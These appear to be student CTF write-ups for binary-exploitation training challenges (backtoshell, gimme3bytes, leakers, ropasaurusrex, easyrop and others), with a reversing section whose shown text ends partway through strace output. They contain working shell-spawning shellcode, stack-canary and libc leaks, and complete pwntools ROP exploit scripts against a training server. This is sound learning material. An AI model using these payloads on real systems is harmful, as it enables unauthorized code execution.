# Challenge Write-ups

## Shellcode

### backtoshell

```c
void main(void) {
  code *UNRECOVERED_JUMPTABLE;
  
  UNRECOVERED_JUMPTABLE = (code *)mmap((void *)0x0,0x1000,7,0x22,-1,0);
  read(0,UNRECOVERED_JUMPTABLE,0x200);
                    /* WARNING: Could not recover jumptable at 0x00401144. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*UNRECOVERED_JUMPTABLE)(0,0,0,0,0,0);
  return;
}
```

`UNRECOVERED_JUMPTABLE` = the compiler is guessing the presence of a jump table, but its not. Its just a buffer.

**mmap**: `mmap` = linux func that allocates memory regions

If the mmap address is zero, the address will be randomized. The other parameters says where to find the size of the data that will be allocated, and its permissions. The fd is used to load a file into memory. in mmap 7 means rwx.

**read** : `read` = linux syscall that reads bytes from file descriptors (for e.g. 0 is the `fd` of `stdin`). Example:

`read(0, UNRECOVERED_JUMPTABLE, 0x200)` reads from zero into the jump table for `0x200` bytes. Note that this info is obtainable trough  `man`.

#### behaviour

`(*memory)(0,0,0,0,0,0)` means: jump to memory. It means that the first six registers contain zeros when jumping. So basically this binary is creating a page in memory, reading user input into it, and then it jumps into it. We want to put some code in that page which when executed will helps us to spawn a shell.

#### Putting together the shellcode

First of all we need a **syscall**:

>`syscall` = way that programs use to interact with the kernel, in order for e.g. to r/w a file, send packets, use hw, etc. To execute syscalls, some registers get set up and the syscall is ran. The kernel knows which syscalls is going to be executed by the `rax` register content (for e.g. read has number `0x00`).

To open a shell, we need the `execve` syscall, which has to be executed with `/bin/sh` as first parameter. In order to do that we will put `0x3b` in the `rax` register, and a pointer to `/bin/sh\x00` into `rdi`.

**Note**: Since the code of the binary sets `rsp` to zero, when the program jumps to our shellcode and we push things on the stack, the execution fails. We first need to move the stack in the middle of the memory page allocated with `memmap`, and then we can execute our shellcode.

```assembly
# we want to write code for the following function call:
# execve('/bin/sh', 0, 0);
# x64 calling convention, we need to put arguments in registers:
#   1. rdi: pointer to b'/bin/sh\x00'
#   2. rsi: pointer to NULL
#   3. rdx: pointer to NULL
#   4. rax: 0x3b

# configuring rsp because since we are jumping to an arbitrary location it's set to 0x0
add rax, 0x100	# rax contains the address of our shellcode
mov rsp, rax		# which means that we are putting rsp 100 bytes over it

# rdi setup (pointer to binsh)
mov rbx, 0x0068732f6e69622f
push rbx
mov rdi, rsp

# rsi, rdx setup (pointer to NULL)
# note that xoring a register with itself will always result in zero
xor rbx, rbx
push rbx
mov rsi, rbx
mov rdx, rbx

# rax setup (0x3b is the syscall code for execve), and executing the call
mov rax, 0x3b
syscall
```

**Note (zeros)**: that zeros in the exploits need to be avoided is the input is read with a scanf function.

**Note (char array as sycall argument)**: We need to put a pointer to a zero to terminate the array of arguments of the execv function, which means that we need to put a pointer to a zero in the `rsi` register (since the function writes those registers in this order: `rax`, `rdi`, `rsi`).

**Note (rax register)**: The `rax` register is usually used for function return values.

After flagging we can get the source code of the binary from the server:

```c
int main() {
    void *data;
    data = mmap(0, 0x1000, 7, 0x22, -1, 0);
    read(0, data, 0x200);
    register long rax __asm__("rax") = data;
    reset_register();
    asm("jmp %rax");
    return 0;
}

int _start() {
    main();
    exit(0);
}
```

### syscall, syscalr

Here we need an auto modifying shellcode, since the only obstacle to executing our exploit is that we cannot give `\x0f` or `\x05` in input to the `read` otherwise the program would exit:

```c
void get_shellcode(char *buffer){
  int i = 0;
  printf("Send shellcode plz?\n");
  read(0, buffer, 1000);
  for (i = 0; i < 1000; i++){
      if ((buffer[i] == 0xcd || buffer[i] == 0x80) || (buffer[i] == 0x0f || buffer[i] == 0x05)){
          printf("Nonono!\n");
          exit(-1);
      }
  }
}
```

The strategy here is to make the shell code increment the content of the instruction pointer. This means that when the code of the challenge is checked after the read, the incriminated bytes are not found, but when the shellcode is acually executed the final code will contain the opcodes for a `syscall`. Here's the assembly:

```assembly
mov rbx, 0x0068732f6e69622f
push rbx
mov rdi, rsp
xor rbx, rbx
push rbx
mov rsi, rsp
mov rdx, rsp
mov rax, 0x3b
mov rbx, 0x101
add qword ptr [rip+0x0], rbx
syscall
```

Here we make the code increment by 257 the last two bytes of itself:

```shell
>>> 0x0f05 - 0x0e04
257
```

And then when we get the assembled code:

```
"\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xDB\x53\x48\x89\xE6\x48\x89\xE2\x48\xC7\xC0\x3B\x00\x00\x00\x48\xC7\xC3\x01\x01\x00\x00\x48\x01\x1D\x00\x00\x00\x00\x0F\x05"
```

We can manually swap the last two bytes:

```
"\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xDB\x53\x48\x89\xE6\x48\x89\xE2\x48\xC7\xC0\x3B\x00\x00\x00\x48\xC7\xC3\x01\x01\x00\x00\x48\x01\x1D\x00\x00\x00\x00\x0E\x04"
```

This means that when the code will be run it will first pass the check, and then correct itself to execute `syscall` as last assembly instruction.

### multistage

**Hint**: the challenge name means that we'll probably need a two step exploit for some reason. In this case the problem is the following:

```c
  puts("What is your name?");
  read(0,buffer,20);
```

Which means that we need an exploit no longer than 20 bytes. The following is a valid (but still too long) shellcode:

```assembly
mov rdi, 0x404070+26    ; we store this address (which is a pointer to 'bin/sh\0') in rdi
mov rsi, rdi
add rsi, 8              ; we move the pointer after the bin/sh
mov rdx, rsi
mov rax, 0x3b
syscall
/bin/sh\x00             ; since we are in a read, we can write directly the string
                        ; in the stack.
```

Length: (26 bytes of shellcode +8 of `/bin/sh\x00`) > 20.

**Solution**: execute another `read`, which reads more byte into the `buffer` global variable, in which we will put the `execve` call to spawn a shell:

```assembly
xor rdi, rdi        ; we are reading from stdin
mov rdx, 128        ; how much to read    
mov esi, eax        ; address of where to read, which is at the end of this shellcode
add eax, 0x14
xor rax,rax            ; read syscall
syscall
```

**Note**: `mov` takes up a lot more bytes than `xor`.

We can also put 20 `nop` at the beginning of our shellcode instead of putting `rax+20` in the `rdx` register, and try to shorten even more our shellcode:

```assembly
xor rax, rax
mov rdi, rax
mov esi, 0x404070
mov edx, 0x100        
syscall
```

### gimme3bytes

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <stdio.h>

int main(){
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  printf("  ________.__                         ________   ___.            __                 \n /  _____/|__| _____   _____   ____   \\_____  \\  \\_ |__ ___.__._/  |_  ____   ______\n/   \\  ___|  |/     \\ /     \\_/ __ \\    _(__  <   | __ <   |  |\\   __\\/ __ \\ /  ___/\n\\    \\_\\  \\  |  Y Y  \\  Y Y  \\  ___/   /       \\  | \\_\\ \\___  | |  | \\  ___/ \\___ \\ \n \\______  /__|__|_|  /__|_|  /\\___  > /______  /  |___  / ____| |__|  \\___  >____  >\n        \\/         \\/      \\/     \\/         \\/       \\/\\/                \\/     \\/ \n>");
  char* array = mmap(0, 0x1000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  int i;
  int temp;
  float ftemp;

  read(0, array, 0x3);
  // write(1, "here we go\\n", 11);
  (*(void(*)())array)();
}
```

Ok so we have a giant memory page allocated to which we put user controlled input into, and then we jump to it and execute it. This would be the simplest ctf ever, if it was not for the fact that we can only read three bytes into it.

This really sucks.

The first thing that comes to mind while tackling this challenge is that we could try to execute another read, but still, how the f*ck would we do that with only 3 bytes of code? To execute a read, since we've got a 64 bit binary and the syscall calling convenction wants function parameters to be set up into registers, we'll need the following:

*  `rax` = `0x0`
*  `rdi` = `0x0`
*  `rsi` = `<READ_CONTENT>`
*   `rdx` = `<READ_LENGTH>`

And then we need to execute the syscall with the relevant opcodes, which alone take up two bytes (`0f 05`). If we run the binary in gdb and we check the content of registers while the program jumps to our shellcode, we'll see the following configuration:

* [x] `rax` = 0
* [x] `rdi` = 0
* [x] `rsi`  = `0x7ffff7ff7000` ( `<destination> `)
* [x] `rdx`  = `0x7ffff7ff7000` (`<how much do we want to read>`)

Where `0x7ffff7ff7000` is the address of the input taken by the `read`. This means that we actually have all we need to correctly perform a `read`. In fact all the registers are correctly set to spawn another read at the time the program jumps to our input.

Note that `rdx` actually contains the address to the page in which our input goes, but since it will be interpreted as an integer representing how much we are going to read, it is more than fine! In fact gdb reports that the address is `0x7ffff7ff7000`, which amounts to 140737354100736. I think its enough.

At first I tried to pass `\x90\x0f\x05`, which is `nop syscall`. Technically it should work, but from `man read` we see that:

> On Linux, read() (and similar system calls) will transfer at most 0x7ffff000 (2,147,479,552) bytes, returning the number of bytes actually  transferred.  (This is true on both 32-bit and 64-bit systems.)

:(

Still, we can change `rdx` content with one byte!

```
pop rdx -> 5a
```

Then, after `rdx` has been properly set up, we can use two syscalls: the first, by using only three bytes, will be a read that will read the proper shellcode to which we'll jump right after the first call. Final exploit:

```python
#!/usr/bin/python3
from pwn import *
...
sc1 = b"\x5A\x0F\x05"
# 2nd sc comes from shellstorm:
# http://shell-storm.org/shellcode/files/shellcode-806.php
sc2 = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
...
p.send(sc1 + b"\x90"*3 + sc2)
p.interactive()
```

**Note**: we can send both shellcodes with one call of the `send` function.

### leakers, gonnaleak, aslr

**Note**: I have put all those challenges in one chapter because they are really similar.

`leakers` code:

```c
int main(){
  char echostring[100];
  int l;
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  puts("Leakers gonna leak!\n");
  while(2){
    l = read(0, echostring, 200);
    if(l == 1 && (echostring[0] == '\n' || echostring[0] == '\x00')){
      puts("Bye!");
      break;
    }
    printf("> %s", echostring);
  }
```

**Note**: The source code of the challenge is found in the server directory after obtaining the shell. We are given only the binary. This is true for every challenge.

To leak values from the stack we can exploit the fact that we have a `read` that puts uset input on the stack, but the size check performed is actually bigger than the buffer itself. Since later on the buffer content is displayed via a  `printf`, which stops reading when it encounters a terminator, we have our exploit: the `read` does not put a terminator when it stops (for e.g. the `scanf` does), which means that we can overwrite null bytes that follows the buffer in the stack to leak stack content up to our canary.

To leak stack canary we can give in input to the `read` which fills the local buffer the following content:

```python
"A"*105
```

To completely fill it and to overwrite the null bytes that makes up the padding of the canary. In fact the canary is located right after the local buffer in the stack:

```python
>>> 0x7fffffffe1b0 - 0x7fffffffe218
-104
```

Then the canary gets leaked by the `printf`:

```python
b'output2: A> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALx\xc0q\t\xae\x81p\x12@'
```

And we can extract it with python:

```python
c = output.split(b"A"*105)[1][:7].rjust(8,b"\x00")
print("canary: " + hex(u64(c)))
```

**Gonnaleak** is similar, but one more step is required: we do not have a global buffer, which means that we cannot jump to a fixed address. The obvious solution is to l<u>eak some sort of address from the stack which belongs to the frame of main, which we can use to jump to our local shellcode by doing some math on relative addressing</u>. Full code below.

```python
#!/usr/bin/python3
import sys
from pwn import *

sc = b"\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xDB\x53\x48\x89\xE6\x48\x89\xE2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05"
a = b"A"*105
b = b"B"*136

context.update(arch='amd64', os='linux')
p = remote("training.jinblack.it", 2011)

input("leaking canary...")
p.send(a)                                        

input("[1] press any key to continue")
output = p.recv()
print(b"output1: " + output)
c = output.split(a)[1][:7].rjust(8, b"\x00")
print("canary: " + hex(u64(c)))

input("leaking useful address from the stack...")
p.send(b)    

input("[2] press any key to continue")
output = p.recv()
print(b"output2: " + output)
addr = output.split(b)[1][:7].ljust(8, b"\x00")
straddr = hex(u64(addr))
print("addr: " + straddr + "\n" + str(addr))

aux = int(straddr, 16)
addr = hex(aux - 343)
print("updated addr: " + addr)

input("injecting shellcode")
addr = struct.pack('<Q', int(addr, base=16))
p.send(b"\x90"*71 + sc + c + b"A"*8 + addr)
p.recv()

input("exiting the loop...")
p.send("\n")
p.recv()
p.interactive()
```

Regarding **ASLR**, we have to go one step further: we have `PIE` enabled, which means no more hardcoded global buffers. We also got `NX`, so no local buffer overflows. To solve this challenge we have to <u>leak the address of the global buffer</u>, which is executable, put there the shellcode and overwrite seip with its address. Source code of the challenge:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <stdio.h>

#define PS1SIZE 100
char ps1[PS1SIZE];

int main(){
  char echostring[100];
  int l;
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  puts("Welcome to Leakers!\n");
  if (mprotect((long)ps1 & 0xfffffffffffff000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC) == -1){
    puts("Failed mprotect!");
    return -1;
  }
  l = read(0, ps1, PS1SIZE);
  if (l>1){
    ps1[l-1]='\x00';
   }
  while(2){
    l = read(0, echostring, 200);
    if(l == 1 && (echostring[0] == '\n' || echostring[0] == '\x00')){
      puts("Bye!");
      break;
    }
    printf("%s> %s", ps1, echostring);
  }
```

## ROP

### ropasaurusrex (32- bit `ROP` chain)

```assembly
$ pwn checksec ropasaurusrex
[*] '/home/zerocool/chall/solved/ropasaurusrex/ropasaurusrex'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
$ file ropasaurusrex
ropasaurusrex: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.18, BuildID[sha1]=96997aacd6ee7889b99dc156d83c9d205eb58092, stripped
```

`main`

```c
int main(void) {
  int res;
  
  vuln();
  res = write(1,&global_buf,4);
  return res;
}
```

`first_func()`

```c
void vuln(void) {
  char buf [136];
  
  read(0,buf,256);
  return;
}
```

#### what do we do?

We have an overflow but we cannot perform a `ROP` exploit since we don't know where `libc` is in memory. Since we cannot print out the stack, we could exploit the `GOT` table to leak the address of `system`. Since the binary is not `PIE`, and the momry addresses of the code are not randomized at runtime, the `GOT` table has a permanent address that can be found with Ghidra. From the previous screenshot we can see the address of `read`: `804961c`, and also the address of `write`. Those two functions alone are enough to read and print to screen the content of the file containing the flag.

**how did we find the address of  `write ` inside the library?**

We search write into Ghidra (`ctrl+shift+e`) and we look for a `jmp` into the `GOT` that has an `<EXTERNAL>::write` parameter. Another way of doing that is using `objdump` and looking for `<write@plt>`:

```shell
objdump -d -M intel ./ropasaurusrex | grep write
```

Note that founding addresses of `GOT` is even easier in gdb:

```assembly
pwndbg> got

GOT protection: No RELRO | GOT functions: 4

[0x8049610] __gmon_start__ -> 0x8048302 (__gmon_start__@plt+6) ◂— push   0 /* 'h' */
[0x8049614] write@GLIBC_2.0 -> 0x8048312 (write@plt+6) ◂— push   8
[0x8049618] __libc_start_main@GLIBC_2.0 -> 0xf7df4e30 (__libc_start_main) ◂— call   0xf7f132c9
[0x804961c] read@GLIBC_2.0 -> 0x8048332 (read@plt+6) ◂— push   0x18
pwndbg>
```

#### `cyclic`

To check how deep are we in the stack we can use `pwn cyclic -n 4 200 | ./ropasaurusrex` which generates a pattern of 4 bytes, 200 chars long (since we are in a 32 bit environment, otherwise we would need a 8 bytes pattern). Then we check with gdb what section of the pattern gets into the instruction pointer (for e.g. gdb would print `Invalid address at 0x6261616b`), and then we can actually see how long must be our padding, by running:

```sh
❯ cyclic -n 4 -l 0x6261616b
140
```

#### leaking `libc`

Since the binary is x86, we need to put call arguments on the stack. We need the following stack layout:

| Before / After                                               |
| ------------------------------------------------------------ |
| ...                                                          |
| **sEBP** / junk                                              |
| **sEIP** / `write` in `PLT` (**what we want to execute**)    |
| Frame of caller / cleaner gadget (cleans up the next three cells and puts a `ret` in order to jump at the address that follows the three stack cells just cleared, which is the address of the `main` |
| Frame of caller / arg #1 (1st argument of what we want to execute, the `fd` of the `write` target) |
| Frame of caller / arg #2 (2nd argument of what we want to execute, what we want to write to `stdout`) |
| Frame of caller / arg #3 (3rd argument of what we want to execute, how much to write) |
| Frame of caller / `main` address (**return address** after that the gadget cleans the stack) |
| ...                                                          |

```python
# STAGE 1
# writing to stdout the address of write, and returning
# a gadget that cleans write's arguments off the stack in order
# to call again the main.
params = [
    e.plt['write'],
    cleaner,
    1,
    e.got['write'],
    4,
    main_addr	# return address, we'll make the binary start again
]							# from the beginning of the main to complete the exploit
exploit = b''
exploit += padding
for p in params:
    exploit += p32(p)
input("[1st stage] press any key to send...")
r.send(exploit)
leak = r.recv()
leak = unpack(leak, 'all', endian='little', sign=False)
sysaddr = leak - write_sys_offset
print('address of system: ' + str(hex(sysaddr)))
```

On top of the stack we have the pointer of the write, the return address (`CCCC`, for now we do not need it), and its parameters. The code above, when assembled into shellcode and executed, will execute a `write` syscall, which will write to `stdout` the address of the `write` itself. How did we tell to the `write` what to print? We passed as argument in the stack (remember x86 calling convention, which unlike x64 uses the stack instead of the register for function arguments) the address of `write` in the `GOT` table, which at runtime corresponds to the address of the same function but in `libc`. This means that since we know the offset of the `write` inside the library, we can compute `libc` base to know the address of `system`, which is the function that we'll use to spawn a shell.

**Note about cleaner gadgets**

```python
e = ELF('./ropasaurusrex')
rop = ROP(e)
libc = ELF("./libc-2.27.so")
write_sys_offset = libc.symbols["write"] - libc.symbols["system"]
binsh_sys_offset = libc.symbols["write"] - next(libc.search(b"/bin/sh"))
cleaner = (rop.find_gadget(['pop esi','pop edi','pop ebp','ret']))[0]
```

This gadget will remove the arguments that we put in the stack to correctly execute the call. It is necessary if we want to execute a `ROP` chain.

#### Spawning a shell

```python
# STAGE 2
# now we will do another rop, but this time
# we will call system with /bin/sh as argument
# binsh is already present in the binary, I found
# its offset using pwntools

print('address of /bin/sh: ' + str(hex(leak+binsh_sys_offset)))
params = [
    sysaddr,
    b'CCCC',
    leak - binsh_sys_offset
]

exploit = b''
exploit += padding
for p in params:
    if type(p) is not int:
        exploit += p
    else:
        exploit += p32(p)
input("[2nd stage] press any key to send...")
r.send(exploit)

input("press any key to spawn a shell...")
r.interactive()
```

### emptyspaces (64-bit ROP chain)

```bash
$ file easyrop
easyrop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=b944b910db4096bc5126a7f2d9285d2a06636a0b, not stripped
```

It is statically linked binary, which means that `libc` is already located into the executable itself. That's why Ghidra lists lots of functions in the code. As a consequence, we can look for gadgets directly into the binary:

```python
>>> e = ELF('./emptyspaces')
>>> rop = ROP(e)
>>> rop.find_gadget(['pop rdi','ret'])
>>> Gadget(0x400696, ['pop rdi', 'ret'], ['rdi'], 0x8)
```

Moreover:

```shell
❯ pwn checksec ./emptyspaces
[*] '/home/zerocool/chall/solved/emptyspaces/emptyspaces'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Actually this is weird because there's no canary in the binary.

**Note**: if the program crashes it is useful to do a `dmesg` to obtain additional info about it. As for security measures:

#### the code

`main`

```c
int main(void)

{
  char buf [64];
  
  setvbuf((FILE *)stdin,(char *)0x0,2,0);
  setvbuf((FILE *)stdout,(char *)0x0,2,0);
  puts("What shall we use\nTo fill the empty spaces\nWhere we used to pwn?");
  read(0,buf,137);
                    /* WARNING: Subroutine does not return */
  empty(buf);
}
```

`empty`:

```c
void empty(char *buf) {
  int i;
  
  for (i = 0; i < 18; i = i + 4) {
    *(undefined4 *)(buf + (long)i * 4) = 0xc3f48948;
  }
  return;
}
```

**Note**:  `empty` does not complicates things, since it just fills some space which would be padding anyway. If for example we fill the buffer with 64 'A' characters, the stack would look like this:

```assembly
pwndbg> x/30gx $rsp
0x7fffffffdf80: 0x00007fffffffe0f8      0x0000000100000002
0x7fffffffdf90: 0x41414141c3f48948      0x4141414141414141
0x7fffffffdfa0: 0x41414141c3f48948      0x4141414141414141
0x7fffffffdfb0: 0x41414141c3f48948      0x4141414141414141
0x7fffffffdfc0: 0x41414141c3f48948      0x4141414141414141
0x7fffffffdfd0: 0x00000000c3f48948      0x0000000000401199
pwndbg> info frame
Stack level 0, frame at 0x7fffffffdfe0:
 rip = 0x400c0e in main; saved rip = 0x401199
 called by frame at 0x7fffffffe0e0
 Arglist at 0x7fffffffdfd0, args:
 Locals at 0x7fffffffdfd0, Previous frame's sp is 0x7fffffffdfe0
 Saved registers:
  rbp at 0x7fffffffdfd0, rip at 0x7fffffffdfd8
```

`sEBP` is overwritten, but we do not need it anyway.

#### What to do

We know that we can perform a buffer overflow, but still we need to leak and put on the stack the canary (if present), and execute at least two syscalls: one to read `/bin/sh` and put it in memory, the other one to execute `execve(/bin/sh, 0, 0);`. We also need to find some gadgets to setup the registers to run a syscall. Weirdly `ropper` won't find useful gadgets, while `ROPgadgets` works just fine.

Note that in order to do that we need to restart the execution from main, since the read only takes 137 bytes and our exploit is longer than that. Since the binary is not `PIE`, this is possible without leaking any address at runtime.

#### The exploit

The payload is made up by some padding necessary to reach `sEIP`. Then there is a first payload which is used to call a `read` to put in the heap `/bin/sh`, then we'll pass the string to put it in memory (at an arbitrary address decided by us):

```python
padding = b'A'*64
payload = b''
payload += padding
payload += b'B'*8
params = [
    # read
    pop_rdx_rsi['address'],
    8,
    binsh_addr,
    pop_rdi['address'],
    0,
    syscall_ret['address'],
    main_addr
]
payload += formatter(params)
print('payload (len : {}):\n{}'.format(len(payload), payload))

input('[1] press any key to send the payload...')
sender(payload)

input('press any key to send /bin/sh...')
sender(b'/bin/sh\x00')


```

After the `read` the execution flow is redirected to the `main`. When the program executes again a similar exploit is performed again, this time calling an `execve` which is used to spawn a shell:

```python
payload = b''
payload += padding
payload += b'B'*8
params = [
    # execve
    pop_rdx_rsi['address'],
    zeros_addr,
    zeros_addr,
    pop_rdi['address'],
    binsh_addr,
    pop_rax['address'],
    0x3b,
    syscall['address']
]
payload += formatter(params)
print('payload (len : {}):\n{}'.format(len(payload), payload))

input('[2] press any key to send the payload...')
sender(payload)
```

Source code:

```c
#include <stdio.h>
#include <unistd.h>

void empty(char * buffer){
    for (int i = 0; i<72/4; i+=4)
        *((int *)buffer + i) = 0xc3f48948;
}

int main(int argc, char * argv[]){
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);

    int i;
    char buffer[56];
    printf("What shall we use\nTo fill the empty spaces\nWhere we used to pwn?\n");
    read(0, buffer, 137);
    empty(buffer);

    return 0;
```

### easyrop

#### Initial considerations

```shell
$ file easyrop
easyrop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=b944b910db4096bc5126a7f2d9285d2a06636a0b, not stripped
```

64 bit statically linked binary: the calling convention needs us to use register to setup a call to `execve` to spawn a shell. This is the only way since the stack is NX:

```shell
$ checksec --file ./easyrop
RELRO           STACK CANARY      NX            PIE         
No RELRO        No canary found   NX enabled    No PIE       
```

And `system` is not present in the binary. We can perform buffer overflow by filling the stack exploiting the `while` loop in the `main` function. Ghidra disassembled code:

```c
undefined8 main(void)

{
  ssize_t bytes_read;
  int var2;
  int var1;
  int array [12];

  len = 0xc3585a5e5f;
  write(1,"Try easyROP!\n",0xd);
  while (2 < len) {
    len = 0;
    bytes_read = read(0,&var1,4);
    len = len + (int)bytes_read;
    bytes_read = read(0,&var2,4);
    len = len + (int)bytes_read;
    array[index] = var2 + var1;
    index = index + 1;
    write(1,&len,4);
  }
  return 0;
}
```

Basically we can fill up 8 bytes (1 cell) of the buffer in each loop iteration, since no array bound check is performed. Between the beginning of the array and seip there are 56 bytes.

#### The actual exploit

This will be the structure of our exploit:  

| BEFORE VULNERABLE READ | AFTER VULNERABLE READ                      |
| ---------------------- | ------------------------------------------ |
| array[...]             | padding                                    |
| ...                    | ...                                        |
| * array[...] + 48      | padding                                    |
| sebp                   | junk                                       |
| seip                   | g1 address                                 |
| ...                    | 0 (stdin)                                  |
| ...                    | global variable address (/bin/sh location) |
| ...                    | 8 (#bytes to read)                         |
| ...                    | 0 (read syscall code)                      |
| ...                    | g2 address                                 |
| ...                    | junk                                       |
| ...                    | g1 address                                 |
| ...                    | global variable address (/bin/sh location) |
| ...                    | pointer to zero (rsi content)              |
| ...                    | pointer to zero (rdx content)              |
| ...                    | 0x3b (execve syscall code)                 |
| ...                    | g3 address                                 |

Basically we want to perform a read to put '/bin/sh' in memory, and pass it as argument to the execve syscall in order to be able to spawn a shell.

Note that:

* g1 is a gadget that performs the following operations:
  
  `pop rdi, pop rsi, pop rdx, pop rax, ret`

* g2:
  
  `syscall, nop, nop, pop rbp, ret `
  
  We need a syscall gadget that also performs a ret in order to be able to execute another syscall (execve /bin/sh) after the read.

* g3: `syscall`

The newline character of `/bin/sh\x00` makes the syscall fail (it will return -1 in `rax`). Solution: pass the string with `pwntools`. Actual exploit:

```python
#!/usr/bin/python3
from pwn import *
from time import sleep

# global variables
binary = './easyrop'
port = 2015
debug = False
remote_enabled = False
delay = 0.05

# initializing address variables
# note that the binary is statically linked
e = ELF(binary)
index = e.symbols['index']
binsh_addr = index+8
zeros_addr = binsh_addr+8

rop = ROP(e)
magic_gadget = rop.find_gadget(['pop rdi','pop rsi','pop rdx','pop rax','ret'])
syscall = rop.find_gadget(['syscall'])
syscall_ret = rop.find_gadget(['syscall','nop','pop','rbp','ret'])
ret = rop.find_gadget(['ret'])

# checking that everything is all right
print('____________________________________')
print('address of all in one gadget: {} - {}'.format(hex(magic_gadget[0]), p64(int(magic_gadget[0]))))
print('address of syscall: {} - {}'.format(hex(syscall[0]), p64(int(magic_gadget[0]))))
print('address of /bin/sh: {}'.format(hex(binsh_addr)))
print('address of zeros: {}'.format(hex(zeros_addr)))
print('____________________________________')

# trying to minimize replicated code
def sender(payload):
    r.send(payload)
    r.send('\x00'*4)
    print('\n sent: {}'.format(str(payload)))
    print('read {} bytes'.format(str(r.recv())))
    sleep(delay)

# setting up execution environment
context.update(arch='amd64', os='linux')
if debug:
    context.log_level = 'DEBUG'
context.terminal = ['tmux', 'splitw', '-h']
if remote_enabled:
    r = remote("training.jinblack.it", port)
else:
    r = process(binary)
    gdb.attach(r, '''
        b main
        continue
        b * 0x400290
    ''')

r.recvuntil('Try easyROP!')

# SENDING THE ACTUAL EXPLOIT

# padding to get to sebp
for i in range(12):
    sender(b'AAAA')

# junking sebp
sender(b'BBBB')
sender(b'BBBB')

# reading '/bin/sh' into the .bss section to allow the call to execve

# address of pop gadget
sender(p64(magic_gadget[0]))
sender(b'\x00'*4)

# fd from which we take the input
sender(b'\x00'*4)
sender(b'\x00'*4)

# where to read
sender(p64(binsh_addr))

# how much to read
sender(p64(8))

# syscall code
sender(b'\x00'*4)
sender(b'\x00'*4)

# sycall + ret gadget
sender(b'\x00'*4)
sender(p64(0x00000000004001b3))

# junking next stack cell
sender(b'BBBB')
sender(b'BBBB')

# setting up the stack to spawn the shell

# address of pop gadget
sender(p64(magic_gadget[0]))
sender(b'\x00'*4)

# address of /bin/sh
sender(p64(binsh_addr))

# pointer to zero
sender(p64(zeros_addr))
sender(b'\x00'*4)

# pointer to zero
sender(p64(zeros_addr))

# # syscall code
sender(b'\x3b')
sender(b'\x00'*4)

# syscall gadget address
sender(p64(syscall[0]))
sender(b'\x00'*4)

# breaking the loop
input('[#1] press any key to break the loop...')
r.send(b'A')
sleep(delay)
input('[#2] press any key to break the loop...')
r.send(b'A')
sleep(delay)
input('[#3] press any key to break the loop...')
r.send(b'A')
sleep(delay)

input('press any key to send /bin/sh')
r.send(b'/bin/sh\x00')
sleep(delay)

# hopefully getting a shell
r.interactive()
```

## Reversing

### revmem

**`strace`**

> strace is **a diagnostic, debugging and instructional userspace utility for Linux**. It is used to monitor and tamper with interactions between processes and the Linux kernel, which include system calls, signal deliveries, and changes of process state.

**`ltrace`**

> ltrace is **a library call tracer** and it is primarily used to trace calls made by programs to library functions. It can also trace system calls and signals, like strace.

#### A first approach

Reversing challenge, meaning that we have just the binary and no remote connection needed. We just need to find the correct output that will make our binary print the flag. In this case we can start launching the binary with some random input to check its behaviour:

```shell
$  ./revmem ciao
Wrong!
```

Ok, now lets `strace` it:

```sh
$ strace ./revmem ciao
execve("./revmem", ["./revmem", "ciao"], 0x7fffffffe338 /* 39 vars */) = 0
brk(NULL)                               = 0x555555559000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=95222, ...}) = 0
mmap(NULL, 95222, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7ffff7fe0000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\20\35\2\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0755, st_size=2030928, ...}) = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7ffff7fde000
mmap(NULL, 4131552, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7ffff79e2000
mprotect(0x7ffff7bc9000, 2097152, PROT_NONE) = 0
